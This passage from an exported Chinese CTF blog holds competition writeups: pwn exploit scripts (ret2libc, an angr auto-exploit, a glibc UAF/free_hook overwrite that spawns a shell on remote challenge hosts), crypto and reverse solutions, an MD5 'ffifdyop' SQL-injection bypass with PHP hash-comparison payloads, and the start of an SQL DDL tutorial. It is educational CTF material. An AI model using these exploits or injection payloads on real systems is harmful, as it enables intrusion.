class="line">r.recvuntil(&quot;&gt;&gt;\n&quot;)</span><br><span class="line">libc_base = u64(r.recvuntil(b&quot;\n&quot;)[:-1].ljust(8,b&#x27;\x00&#x27;)) - libc.symbols[&#x27;setbuf&#x27;] + 0x4000000000</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">system_addr = libc.symbols[&#x27;system&#x27;]+libc_base</span><br><span class="line">bin_sh = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">meau(2)</span><br><span class="line">payload=b&#x27;a&#x27;*0x88+p64(libc_base+0x0000000000063e5c)+p64(system_addr)*5+p64(bin_sh)+p64(system_addr)*5</span><br><span class="line">r.sendlineafter(&quot;&gt; &quot;,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="捉迷藏"><a class="markdownIt-Anchor" href="#捉迷藏"></a> <strong>捉迷藏</strong></h4>
<p>就是把SCTF的一道自动化题目的一种情况拿了过来，之前的脚本改改就能直接打。</p>
<p><img src="/2022/09/MT-CTF-Writeup/LINGgj13umO_LKwO4910kQ.png" alt="9"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">from angr.sim_options import LAZY_SOLVES</span><br><span class="line">import claripy</span><br><span class="line">from angr.sim_options import ZERO_FILL_UNCONSTRAINED_MEMORY, unicorn</span><br><span class="line">from angr import Project, SimProcedure</span><br><span class="line">from pwn import *</span><br><span class="line">context_level = &quot;debug&quot;</span><br><span class="line">class NopsFun(SimProcedure):</span><br><span class="line">    def run(self):</span><br><span class="line">        print (&#x27;skip&#x27;)</span><br><span class="line">        return 0</span><br><span class="line">out_list = []</span><br><span class="line">g_idx = 0</span><br><span class="line">class fksth(SimProcedure):</span><br><span class="line">    def run(self, a1, a2):</span><br><span class="line">        print (&#x27;fksth&#x27;)</span><br><span class="line">        constraints = []</span><br><span class="line">        idx = 0</span><br><span class="line">        while True:</span><br><span class="line">            v = self.state.memory.load(a2+idx, 1)</span><br><span class="line">            if self.state.solver.eval(v) == 0:</span><br><span class="line">                break</span><br><span class="line">            constraints.append(v == self.state.memory.load(a1+idx, 1))</span><br><span class="line">            idx += 1</span><br><span class="line"></span><br><span class="line">        retval = claripy.If(self.state.solver.And(*constraints), claripy.BVV(0, 64), claripy.BVV(1, 64))</span><br><span class="line">        return retval</span><br><span class="line"></span><br><span class="line">class input_val(SimProcedure):</span><br><span class="line">    def run(self):</span><br><span class="line">        global g_idx</span><br><span class="line">        data1 = claripy.BVS(&#x27;input%x&#x27; %g_idx, 32)</span><br><span class="line">        data2 = claripy.BVV(0, 32)</span><br><span class="line">        ret = self.state.solver.Concat(data2, data1)</span><br><span class="line">        out_list.append((g_idx, &#x27;int&#x27;, data1))</span><br><span class="line">        g_idx += 1</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">class input_line(SimProcedure):</span><br><span class="line">    def run(self, buff, len):</span><br><span class="line">        global g_idx</span><br><span class="line">        len= self.state.solver.eval(len)</span><br><span class="line">        data = claripy.BVS(&#x27;input%x&#x27; %g_idx, len* 8)</span><br><span class="line">        out_list.append((g_idx, &#x27;str&#x27;, data))</span><br><span class="line">        g_idx += 1</span><br><span class="line">        self.state.memory.store(buff, data)</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">def aeg(binary):</span><br><span class="line">    p = angr.Project(binary, load_options=&#123;&#x27;auto_load_libs&#x27;:False, &#x27;load_debug_info&#x27;: True&#125;)</span><br><span class="line">    for symbol in p.loader.symbols:</span><br><span class="line">        #print (symbol.name)</span><br><span class="line">        if &#x27;main&#x27; == symbol.name:</span><br><span class="line">            main_addr = symbol.rebased_addr</span><br><span class="line">            print (&#x27;main=%x\n&#x27; %main_addr)</span><br><span class="line">        if &#x27;fksth&#x27; in symbol.name:</span><br><span class="line">            fksth_addr = symbol.rebased_addr</span><br><span class="line">        if &#x27;init&#x27; in symbol.name:</span><br><span class="line">            init_addr = symbol.rebased_addr</span><br><span class="line">        if &#x27;input_line&#x27; in symbol.name:</span><br><span class="line">            input_line_addr = symbol.rebased_addr</span><br><span class="line">        if &#x27;input_val&#x27; in symbol.name:</span><br><span class="line">            input_val_addr = symbol.rebased_addr</span><br><span class="line">        if &#x27;backdoor&#x27; in symbol.name:</span><br><span class="line">            backdoor_addr = symbol.rebased_addr</span><br><span class="line">        print (&#x27;symbol=%s, addr=%x&#x27; %(symbol.name, symbol.rebased_addr))</span><br><span class="line"></span><br><span class="line">    cfg = p.analyses.CFGFast()</span><br><span class="line">    main_func = cfg.kb.functions[main_addr]</span><br><span class="line">    main_block_addrs = main_func.block_addrs</span><br><span class="line">    </span><br><span class="line">    max_disp = -0xffffffff</span><br><span class="line">    for call_site in main_func.get_call_sites():</span><br><span class="line">        target = main_func.get_call_target(call_site)</span><br><span class="line">        if target == input_line_addr:</span><br><span class="line">            #拿出对应的input_line代码块</span><br><span class="line">            block = p.factory.block(call_site).capstone</span><br><span class="line">            for insn in block.insns:</span><br><span class="line">                print (insn)</span><br><span class="line">                if insn.mnemonic == &#x27;lea&#x27;:</span><br><span class="line">                    if insn.disp &gt; max_disp:</span><br><span class="line">                        max_disp = insn.disp</span><br><span class="line">                        vul_addr = call_site</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    print (max_disp)</span><br><span class="line">    print (&#x27;addr=%x&#x27; %vul_addr)</span><br><span class="line">    graph = main_func.transition_graph</span><br><span class="line">    for block_node in graph.nodes:</span><br><span class="line">        if (block_node.addr &lt;= vul_addr) &amp; (vul_addr &lt; (block_node.addr+block_node.size)):</span><br><span class="line">            vul_block = block_node</span><br><span class="line">    cur_block = vul_block</span><br><span class="line"></span><br><span class="line">    path = [cur_block.addr]</span><br><span class="line">    while cur_block.addr != main_addr:</span><br><span class="line">        for key in graph.predecessors(cur_block):</span><br><span class="line">            cur_block = key</span><br><span class="line">            path = [cur_block.addr] + path</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    void_addrs = []</span><br><span class="line">    for node in graph.nodes:</span><br><span class="line">        if node.addr not in path:</span><br><span class="line">            if node.addr in main_block_addrs:</span><br><span class="line">                void_addrs.append(node.addr)</span><br><span class="line"></span><br><span class="line">    print (&#x27;-&#x27;.join(&#x27;0x%x&#x27; %p for p in path))</span><br><span class="line">        </span><br><span class="line">    state = p.factory.blank_state(addr=main_addr, add_options=&#123;LAZY_SOLVES&#125;)</span><br><span class="line">    state.options.add(ZERO_FILL_UNCONSTRAINED_MEMORY)</span><br><span class="line">    state.options.add(LAZY_SOLVES)</span><br><span class="line">    simgr = p.factory.simgr(state)</span><br><span class="line">    print_plt = p.loader.main_object.plt[&#x27;printf&#x27;]</span><br><span class="line">    p.hook(print_plt, NopsFun())</span><br><span class="line">    p.hook(fksth_addr, fksth())</span><br><span class="line">    p.hook(init_addr, NopsFun())</span><br><span class="line">    p.hook(input_line_addr, input_line())</span><br><span class="line">    p.hook(input_val_addr, input_val())</span><br><span class="line">    def log_state(simgr):</span><br><span class="line">        for state in simgr.active:</span><br><span class="line">            print (&#x27;pc=%s&#x27; %state.regs.pc)</span><br><span class="line">            if state.solver.eval(state.regs.pc) in void_addrs:</span><br><span class="line">                print (&#x27;remove&#x27;)</span><br><span class="line">                simgr.stashes[&#x27;active&#x27;].remove(state)</span><br><span class="line">            if state.solver.eval(state.regs.pc) == vul_block.addr:</span><br><span class="line">                print (&#x27;found&#x27;)</span><br><span class="line">                simgr.stashes[&#x27;found&#x27;].append(state)</span><br><span class="line">                simgr.stashes[&#x27;active&#x27;].remove(state)</span><br><span class="line">        return simgr</span><br><span class="line"></span><br><span class="line">    simgr.explore(step_func=log_state)</span><br><span class="line">    state = simgr.stashes[&#x27;found&#x27;][0]</span><br><span class="line">    </span><br><span class="line">    s = b&#x27;&#x27;</span><br><span class="line">    for (idx, type, data) in out_list:</span><br><span class="line">        if type == &#x27;int&#x27;:</span><br><span class="line">            print (&#x27;%x: %s&#x27; %(idx, state.solver.eval(data)))</span><br><span class="line">            s += b&#x27;%d &#x27; %(state.solver.eval(data))</span><br><span class="line">        else:</span><br><span class="line">            print (&#x27;%x: %s&#x27; %(idx, state.solver.eval(data, cast_to=bytes)))</span><br><span class="line">            s += state.solver.eval(data, cast_to=bytes)</span><br><span class="line">        </span><br><span class="line">    s += (-max_disp + 8)*b&#x27;a&#x27; + p64(backdoor_addr) + b&#x27;a&#x27; * 0x40</span><br><span class="line">    print(&quot;back_door = &quot; + hex(backdoor_addr))</span><br><span class="line">    print(&quot;-max_disp = &quot; + hex(-max_disp))</span><br><span class="line">    print(s)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">r = remote(&quot;39.106.76.68&quot;,44064)</span><br><span class="line">r.sendline(aeg(&quot;./pwn&quot;))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="mininep1美团决赛ctfwriteup"><a class="markdownIt-Anchor" href="#mininep1美团决赛ctfwriteup"></a> <strong>Mininep1–美团决赛CTF–Writeup</strong></h1>
<h2 id="一-战队信息"><a class="markdownIt-Anchor" href="#一-战队信息"></a> <strong>一、战队信息</strong></h2>
<p>战队名称：Mininep1-1</p>
<p>个人排名：4</p>
<h2 id="二-解题详情"><a class="markdownIt-Anchor" href="#二-解题详情"></a> <strong>二、解题详情</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/xjNAP_qZrZsv3u0Wrp_gOg-166427030055210.png" alt="10"></p>
<h2 id="三-解题过程"><a class="markdownIt-Anchor" href="#三-解题过程"></a> <strong>三、解题过程</strong></h2>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> <strong>Misc</strong></h2>
<h3 id="what_is_that"><a class="markdownIt-Anchor" href="#what_is_that"></a> <strong>What_is_that</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/hQaXdjeI8kdpDiOkGqIXSg.png" alt="11"></p>
<p>qwq手撸flag：</p>
<p>flag{1f576e5e-a0db-4fe2-8678-5ec4d227d41a}</p>
<h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> <strong>Pwn</strong></h2>
<h3 id="heap"><a class="markdownIt-Anchor" href="#heap"></a> <strong>heap</strong></h3>
<p>就是一个glibc2.27的UAF漏洞，但是申请的堆块大小只能是0x20或0x30，当申请0x20时，edit函数存在溢出修改chunk_size泄露libc即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/pwn&quot;)</span><br><span class="line"># r=remote(&quot;47.95.8.59&quot;,24835)</span><br><span class="line">elf=ELF(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/pwn&quot;)</span><br><span class="line">libc=ELF(&quot;/home/ubuntu/pwn/题目/i春秋/MTCTF/libc.so.6&quot;)</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    src=&#x27;&#x27;&#x27;</span><br><span class="line">    b *$rebase(0x127C)</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    gdb.attach(r,src)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(&quot;&gt;&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(&quot;What size of paper do you want to add?&quot;,str(size))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(&quot;Which page do you want torn up?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(&quot;Which page do you want to write?&quot;,str(index))</span><br><span class="line">    r.sendlineafter(&quot;How many words do you need to write?&quot;,str(len(content)))</span><br><span class="line">    r.sendafter(&quot;Content:&quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(&quot;Which page do you want to review?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">add(0x18)</span><br><span class="line">for i in range(0x18):</span><br><span class="line">    add(0x1f)</span><br><span class="line"></span><br><span class="line">payload=p64(0)*3+p64(0x421)</span><br><span class="line">edit(0,payload)</span><br><span class="line">delete(1)</span><br><span class="line">show(1)</span><br><span class="line">libc_base=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x10-96-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line">delete(3)</span><br><span class="line">edit(3,p64(free_hook))</span><br><span class="line">add(0x1f)</span><br><span class="line">add(0x1f)</span><br><span class="line">edit(0x17,p64(system_addr))</span><br><span class="line">edit(4,&quot;/bin/sh&quot;)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> <strong>Crypto</strong></h2>
<h3 id="strange_lwe"><a class="markdownIt-Anchor" href="#strange_lwe"></a> <strong>strange_lwe</strong></h3>
<p>LWE问题，用babai’s CVP算法求解。</p>
<p>这里我本来想直接通过误差来进行判断的，然而发现有些位对不上。因此还是绕了个弯先把s给算出来了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler</span><br><span class="line">from sage.modules.free_module_integer import IntegerLattice</span><br><span class="line">import numpy as np</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from hashlib import sha1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Babai&#x27;s Nearest Plane algorithm</span><br><span class="line">def Babai_closest_vector(M, G, target):</span><br><span class="line">    small = target</span><br><span class="line">    for _ in range(5):</span><br><span class="line">        for i in reversed(range(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).round()</span><br><span class="line">            small -=  M[i] * c</span><br><span class="line">    return target - small</span><br><span class="line">q = 401</span><br><span class="line">m = 64</span><br><span class="line">n = 16</span><br><span class="line">a = 0.025</span><br><span class="line">num = 48</span><br><span class="line">data=open(&#x27;data.txt&#x27;,&#x27;r&#x27;).readlines()</span><br><span class="line">A=Matrix(ZZ,eval(data[0].strip()))</span><br><span class="line">cipher=eval(data[1].strip())</span><br><span class="line">print(len(cipher))</span><br><span class="line"></span><br><span class="line">#t=DiscreteGaussianDistributionIntegerSampler(a*q)</span><br><span class="line">#print([ t() for _ in range(1000)])</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for k in range(num):</span><br><span class="line">	rt=cipher[k][0]</span><br><span class="line">	Lattice = matrix(ZZ, m + n, m)</span><br><span class="line">	for i in range(m):</span><br><span class="line">		for j in range(n):</span><br><span class="line">			Lattice[m + j, i] = A[i][j]</span><br><span class="line">		Lattice[i, i] = q</span><br><span class="line"></span><br><span class="line">	lattice = IntegerLattice(Lattice, lll_reduce=True)</span><br><span class="line">	print(&quot;LLL done&quot;)</span><br><span class="line">	gram = lattice.reduced_basis.gram_schmidt()[0]</span><br><span class="line">	target = vector(ZZ,rt)</span><br><span class="line">	cv = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line">	#print(&quot;Closest Vector: &#123;&#125;&quot;.format(cv))</span><br><span class="line">	error=cv-target</span><br><span class="line">	print(&quot;Error: &#123;&#125;&quot;.format(error))</span><br><span class="line">	if any([abs(e)&gt;40 for e in error]):</span><br><span class="line">		res+=&#x27;0&#x27;</span><br><span class="line">	else:</span><br><span class="line">		res+=&#x27;1&#x27;</span><br><span class="line">	print(res)</span><br><span class="line">	A = matrix(Zmod(q), A)</span><br><span class="line">	try:</span><br><span class="line">		s = A.solve_right(cv)</span><br><span class="line">		print(&#x27;s: &#123;&#125;&#x27;.format(s))</span><br><span class="line">	except:</span><br><span class="line">		print(&quot;no solution&quot;)</span><br><span class="line">		continue</span><br><span class="line">print(res)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">s=(195, 202, 322, 287, 230, 311, 396, 58, 242, 191, 117, 41, 248, 264, 139, 291)</span><br><span class="line">s=vector(GF(q),s)</span><br><span class="line">A=Matrix(GF(q),A)</span><br><span class="line">print(A*s)</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for k in range(num):</span><br><span class="line">	tmp=[]</span><br><span class="line">	for l in range(num*8):</span><br><span class="line">		c=vector(ZZ,cipher[k][l])</span><br><span class="line">		As=vector(GF(q),A*s)</span><br><span class="line">		t=c-As</span><br><span class="line">		t=[tt if tt&lt;(q//2) else q-tt for tt in t]</span><br><span class="line">		tmp.extend(t)</span><br><span class="line">	if all([ tt&lt;40 for tt in t]):</span><br><span class="line">		res+=&#x27;1&#x27;</span><br><span class="line">	else:</span><br><span class="line">		res+=&#x27;0&#x27;</span><br><span class="line">print(res)</span><br><span class="line">#res=&#x27;000000110110001010100111101100001101011110011110&#x27;</span><br><span class="line">my_secret_bits=list(map(int,res))</span><br><span class="line">flag = &#x27;flag&#123;&#x27; + sha1(str(my_secret_bits).encode()).hexdigest() + &#x27;&#125;&#x27;</span><br><span class="line">print(flag)</span><br><span class="line">#flag&#123;7e0fefd15c630d4b41db2ac9e18d48d691b3d419&#125;</span><br></pre></td></tr></table></figure>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> <strong>Reverse</strong></h2>
<h3 id="crackme"><a class="markdownIt-Anchor" href="#crackme"></a> <strong>crackme</strong></h3>
<p>题目核心逻辑在digest函数里，首先可以看到这里有个SM4加密:</p>
<p><img src="/2022/09/MT-CTF-Writeup/9JL4IvvtABLoNAquRwetrA.png" alt="13"></p>
<p>接下来最底下有个RC4：</p>
<p><img src="/2022/09/MT-CTF-Writeup/e7Ydd8t3cchsUByy2klzDQ.png" alt="14"></p>
<p>猜测程序是先做SM4加密，最后RC4并转hex输出digest。SM4密钥已给出，而RC4密钥动调可以发现就是LicenseKey。因此用CyberChef在线跑一下解密就出了。</p>
<p><img src="/2022/09/MT-CTF-Writeup/XYLE2NUnBulMjsDqQRqnVA.png" alt="15"></p>
<p>flag{c6545808-81ba-48c6-b082-df559da10751}</p>
<h2 id="web_复现"><a class="markdownIt-Anchor" href="#web_复现"></a> Web_复现</h2>
<h3 id="mako_imagemagick"><a class="markdownIt-Anchor" href="#mako_imagemagick"></a> <strong>Mako_imagemagick:</strong></h3>
<p>后续补上！</p>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>Re</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/12/RCTF2022-Writeup/</url>
    <content><![CDATA[<h1 id="rctf2022-writeup"><a class="markdownIt-Anchor" href="#rctf2022-writeup"></a> RCTF2022-Writeup</h1>
<p>​                                                                              ------------------------------------TWe1v3</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2>
<h3 id="ez_alient"><a class="markdownIt-Anchor" href="#ez_alient"></a> ez_alient</h3>
<p>使用zsteg扫描alien.tmp获得一串base64编码</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221210144522995.png" alt="01"></p>
<p>解码得到：pwd=“N0bOdy_l0ves_Me”</p>
<p>解压alien_invasion.zip，获得alien_invasion文件，使用file指令识别得知是PE32+ executable (console) x86-64, for MS Windows，使用PyInstaller Extractor对文件进行反编译，注意这里的系统python版本一定得是3.8的，不然反编译不完全。</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212245026.png" alt="image-20221221212245026"></p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221213006594.png" alt="image-20221221213006594"></p>
<p>使用010editor打开alien_invasion.pyc，能够看到有这提示</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212640499.png" alt="image-20221221212640499"></p>
<p>从alien_invasion.pyc得到一串base64编码VTJreE0yNWpNdz09，解码为：Si13nc3</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212807233.png" alt="image-20221221212807233"></p>
<p>打开PYZ-00.pyz_extracted文件夹，根据alien_invasion.pyc中的指示pyc文件中获得相关base64编码，统计为：</p>
<table>
<thead>
<tr>
<th>字符串</th>
<th>解码</th>
<th>pyc文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>s = b’VTJreE0yNWpNdz09’</td>
<td>Si13nc3</td>
<td>alien_invasion.pyc</td>
</tr>
<tr>
<td>a = b’TVRVPQ==’</td>
<td>15</td>
<td>alien.pyc</td>
</tr>
<tr>
<td>l = b’Tm5WMA==’</td>
<td>6ut</td>
<td>settings.pyc</td>
</tr>
<tr>
<td>m = b’YURBeFpHbHVPUT09   VDI0PQ==    VTJreE0yNVVNWGs9’</td>
<td>h01din9_On_Si13nT1y</td>
<td>ship.pyc</td>
</tr>
<tr>
<td>a = b’YmtWMlJYST0=’</td>
<td>nEvEr</td>
<td>bullet.pyc</td>
</tr>
<tr>
<td>t = b’ZFhBPQ==’</td>
<td>up</td>
<td>game_stats.pyc</td>
</tr>
<tr>
<td>k = b’T1dsMmFXNDU=’</td>
<td>9ivin9</td>
<td>button.pyc</td>
</tr>
<tr>
<td>m = b’SmlZPQ==’</td>
<td>&amp;&amp;</td>
<td>scoreboard.pyc</td>
</tr>
</tbody>
</table>
<p>简单拼接可得flag：</p>
<p>RCTF{Si13nc3_15_nEvEr_9ivin9_up_&amp;&amp;_6ut_h01din9_On_Si13nT1y}</p>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
]]></content>
  </entry>
  <entry>
    <title>SQL- ffifdyop绕过</title>
    <url>/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>当看到这个绕过并没法察觉的时候，我就知道我的SQL注入还没入门，在浏览其他师傅的blog中，知道这是绕过中的一个奇妙的字符串<qwq></qwq></p>
<span id="more"></span>
<h1 id="sql-ffifdyop绕过"><a class="markdownIt-Anchor" href="#sql-ffifdyop绕过"></a> SQL-- ffifdyop绕过</h1>
<h3 id="绕过技巧解读"><a class="markdownIt-Anchor" href="#绕过技巧解读"></a> 绕过技巧解读</h3>
<p>先给你看一个东西:276f7227，看到这个你想到了什么？</p>
<p>&lt;----‘or’----&gt;有没有给你一个很熟悉的感觉！是的这正是“ffidfyop”的md5加密后的值：276f722736c95d99e921722cf9ed621c 我们都知道SQL语句会自动将Hex转成Ascii来解释。</p>
<p>因此拼接之后：</p>
<p><code>select * from admin where password=''or'6&lt;乱码&gt;'</code></p>
<p>相当于<code>select * from admin where password=''or'1</code>，一个永真式，以此来绕过MD5()。</p>
<p>同理的还有：129581926211651571912466741651878684928 也可达同样的效果</p>
<p>总之，相当于 <code>select * from admin where password=''or ture</code>。</p>
<h3 id="例题解读"><a class="markdownIt-Anchor" href="#例题解读"></a> 例题解读：</h3>
<h4 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5"></a> [BJDCTF 2020]easy_md5</h4>
<p>打开链接，看到输入框，第一时间就想到注入：</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911164839623.png" alt="麻了"></p>
<p>试过诸多注入无果，抓了一下包，看到hint：</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911165221183.png" alt="麻了"></p>
<p>看到hint，就知道是绕过MD5()。</p>
<p>框内输入“ffifdyop”，成功绕过。</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911165824467.png" alt="麻了"></p>
<p>查看源代码，这里有很多种绕过方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=QNKCDZO&amp;b=240610708</span><br><span class="line"></span><br><span class="line">?a=s878926199a&amp;b=s155964671a</span><br><span class="line"></span><br><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911170317691.png" alt="麻了"></p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911170742947.png" alt="麻了"></p>
<p>同理，POST双参数数组绕过。</p>
<hr>
<p>这里有其他师傅的顶级理解：</p>
<p><em>弱类型比较变成了强类型比较了，这里就只能用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false==false成立使条件成立</em></p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911171036454.png" alt="麻了"></p>
<p>flag：NSSCTF{762d2772-8382-4ec4-9f9c-8354f7d0c995}</p>
<h3 id="结"><a class="markdownIt-Anchor" href="#结"></a> 结</h3>
<p>学到了新东西，这才是入门诶，呜呜呜，我好菜！！！</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>绕过技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-增删改查</title>
    <url>/2022/09/SQL-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<p>Do u know Create and Drop Database, Create, Alter and Drop Tables, Select, Insert, Update, Delete Commands.</p>
<span id="more"></span>
<h2 id="introduction-descriptive"><a class="markdownIt-Anchor" href="#introduction-descriptive"></a> Introduction (Descriptive)</h2>
<p>Content:- Creating and Maintaining Tables, Objectives, The CREATE DATABASE Statement, CREATE DATABASE Options, Database Design, Creating a Data Dictionary, Creating Key Fields, The CREATE TABLE Statement, The Table Name, The Field Name, The Field’s Data Type, The NULL Value, Table Storage and Sizing, Creating a Table from an Existing Table, The ALTER TABLE Statement, The DROP TABLE Statement, The DROP DATABASE Statement.</p>
<h2 id="details"><a class="markdownIt-Anchor" href="#details"></a> Details</h2>
<p>It covers the <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong> statements, which are collectively known as data definition statements. (In contrast, the <strong>SELECT</strong>, <strong>UPDATE</strong>, <strong>INSERT</strong>, and <strong>DELETE</strong> statements are often described as data manipulation statements.) By the end, you will understand and be able to do the following:</p>
<ul>
<li>Create key fields</li>
<li>Create a database with its associated tables</li>
<li>Create, alter, and drop a table</li>
<li>Add data to the database</li>
<li>Modify the data in a database</li>
<li>Drop databases</li>
</ul>
<p>The syntax of the <strong>CREATE</strong> statements can range from the extremely simple to the complex, depending on the options your database management system (DBMS) supports and how detailed you want to be when building a database.</p>
<p><strong>NOTE:</strong> The examples used today were generated using Personal Oracle7. Please see the documentation for your specific SQL implementation for any minor differences in syntax.</p>
<h2 id="the-create-database-statement"><a class="markdownIt-Anchor" href="#the-create-database-statement"></a> <strong>The CREATE DATABASE Statement</strong></h2>
<p>The first data management step in any database project is to create the database. This task can range from the elementary to the complicated, depending on your needs and the database management system you have chosen. Many modern systems (including Personal Oracle7) include graphical tools that enable you to completely build the database with the click of a mouse button. This time-saving feature is certainly helpful, but you should understand the SQL statements that execute in response to the mouse clicks.</p>
<p>Through personal experience, we have learned the importance of creating a good SQL install script. This script file contains the necessary SQL code to completely rebuild a database or databases; the script often includes database objects such as indexes, stored procedures, and triggers. You will see the value of this script during development as you continually make changes to the underlying database and on occasion want to completely rebuild the database with all the latest changes. Using the graphical tools each time you need to perform a rebuild can become extremely time-consuming. In addition, knowing the SQL syntax for this procedure enables you to apply your knowledge to other database systems.</p>
<p>The syntax for the typical <strong>CREATE DATABASE</strong> statement looks like this:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE DATABASE database_name</p>
<p>Because the syntax varies so widely from system to system, we will not expand on the <strong>CREATE DATABASE</strong> statement’s syntax. Many systems do not even support an SQL <strong>CREATE DATABASE</strong> command. However, all the popular, more powerful, relational database management systems (RDBMSs) do provide it. Instead of focusing on its syntax, we will spend some time discussing the options to consider when creating a database.</p>
<h2 id="create-database-options"><a class="markdownIt-Anchor" href="#create-database-options"></a> <strong>CREATE DATABASE Options</strong></h2>
<p>The syntax for the <strong>CREATE DATABASE</strong> statement can vary widely. Many SQL texts skip over the <strong>CREATE DATABASE</strong> statement and move directly on to the <strong>CREATE TABLE</strong> statement. Because you must create a database before you can build a table, this section focuses on some of the concepts a developer must consider when building a database. The first consideration is your level of permission. If you are using a relational database management system (RDBMS) that supports user permissions, you must make sure that either you have system administrator-level permission settings or the system administrator has granted you <strong>CREATE DATABASE</strong> permission. Refer to your RDBMS documentation for more information.</p>
<p>Most RDBMSs also allow you to specify a default database size, usually in terms of hard disk space (such as megabytes). You will need to understand how your database system stores and locates data on the disk to accurately estimate the size you need. The responsibility for managing this space falls primarily to system administrators, and possibly at your location a database administrator will build you a test database.</p>
<p>Don’t let the <strong>CREATE DATABASE</strong> statement intimidate you. At its simplest, you can create a database named <strong>PAYMENTS</strong> with the following statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>SQL&gt; <strong>CREATE DATABASE PAYMENTS;</strong></p>
